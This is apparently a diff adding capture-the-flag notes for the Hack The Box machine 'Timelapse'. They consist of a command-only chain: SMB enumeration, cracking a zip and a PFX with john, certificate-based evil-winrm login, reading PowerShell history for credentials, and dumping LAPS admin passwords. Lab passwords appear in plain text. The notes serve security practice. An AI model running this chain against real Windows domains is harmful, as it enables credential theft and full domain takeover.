@@ -209,3 +209,23 @@ net group 'CORE STAFF'
 Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
 evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
 ```
+
+
+# Win-Timelapse
+```
+smbclient -L \\\\10.10.11.152\\
+smbclient \\\\10.10.11.152\\Shares
+zip2john winrm_backup.zip > hash_zip
+john hash_zip -w=/usr/share/wordlists/rockyou.txt
+pfx2john legacyy_dev_auth.pfx > hash_pfx
+john hash_pfx -w=/usr/share/wordlists/rockyou.txt
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key
+openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
+evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+net user svc_deploy
+upload AdmPwd.PS
+Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+evil-winrm -i 10.10.11.152 -S -u administrator -p 'A+@PQh;Cj0+{Cb2oBJBybYry'
+```
